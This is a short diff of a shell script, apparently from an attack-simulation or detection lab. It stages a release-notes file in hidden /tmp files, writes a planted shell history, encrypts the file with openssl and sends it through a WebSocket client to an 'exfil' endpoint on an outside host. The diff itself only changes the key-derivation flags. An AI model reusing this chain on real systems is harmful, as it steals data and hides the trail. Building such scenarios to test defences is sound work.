@@ -200,13 +200,13 @@ hist <<'EOF'
 cat /srv/app/releases/release-notes.txt > /tmp/.u6
 wc -c /tmp/.u6
 printf 'U3Rvcm0tV2luZC0yMDI2' | base64 -d > /tmp/.k6
-openssl enc -aes-256-cbc -pbkdf2 -salt -pass file:/tmp/.k6 -in /tmp/.u6 -out /tmp/.u6.enc
+openssl enc -aes-256-cbc -salt -md sha256 -pass file:/tmp/.k6 -in /tmp/.u6 -out /tmp/.u6.enc
 ls -lh /tmp/.u6.enc
 base64 -w0 /tmp/.u6.enc
 EOF
 echo "  Encrypting with AES-256-CBC..."
 printf '%s' "$WS_PASSWORD" > /tmp/.k6
-openssl enc -aes-256-cbc -pbkdf2 -salt -pass file:/tmp/.k6 -in /srv/app/releases/release-notes.txt -out /tmp/.u6.enc
+openssl enc -aes-256-cbc -salt -md sha256 -pass file:/tmp/.k6 -in /srv/app/releases/release-notes.txt -out /tmp/.u6.enc
 echo "  Sending via WebSocket..."
 python3 "$ROOT/attacker/websocket_client.py" --url "ws://$WS_IP:8080/exfil" --file /tmp/.u6.enc || true
 echo "  [✓] WebSocket exfiltration complete"
